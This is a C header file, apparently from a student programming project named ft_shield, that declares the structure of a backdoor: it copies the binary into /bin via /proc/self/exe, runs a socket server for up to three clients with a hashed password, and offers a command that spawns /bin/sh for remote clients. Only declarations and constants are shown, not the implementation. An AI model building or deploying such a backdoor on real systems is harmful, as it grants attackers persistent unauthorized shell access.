#ifndef FT_SHIELD_H
# define FT_SHIELD_H

# include <fcntl.h>
# include <libgen.h>
# include <netinet/in.h>
# include <signal.h>
# include <stdbool.h>
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <sys/select.h>
# include <sys/socket.h>
# include <sys/wait.h>
# include <unistd.h>

# define STUDENT_LOGIN "lmartin"
# define PRG_NAME "ft_shield"
# define TARGET_LOCATION "/bin"
# define PROC_SELF_EXE "/proc/self/exe"

# define BIN_SHELL "/bin/sh"
# define READ_END 0
# define WRITE_END 1

# define BUFFER_SIZE 4096
# define MAX_PATH_SIZE 256

# define MAX_CLIENTS 3

typedef struct			s_client
{
	int					fd;
	bool				logged;
	int					fd_shell;
	pid_t				shell_pid;
	pid_t				supervisor_pid;
	bool				shell;
}						t_client;

typedef struct			s_serv
{
	int					port;
	struct sockaddr_in	addr;
	int					sockfd;
	fd_set				fd_read;
	fd_set				fd_master;
	t_client			clients[MAX_CLIENTS];
	int					nb_clients;
}						t_serv;

# define HASHED_PWD "0315b4020af3eccab7706679580ac87a710d82970733b8719e70af9b57e7b9e6"

# define NB_CMDS 3
# define CMD				{"help", "shell", "exit"}
# define CMD_FUNC			{&show_help, &spawn_shell, &logout}

# define send_str(x,y) send(x, y, strlen(y), 0)

extern t_serv		serv;

/* server.c */
void		remove_client(t_serv *serv, int fd);
void		backdoor(void);

/* shell.c */
void		launch_command(t_serv *serv, int fd, char *cmd);

/* sha256.c */
char		*sha256(char *str, size_t size);

#endif
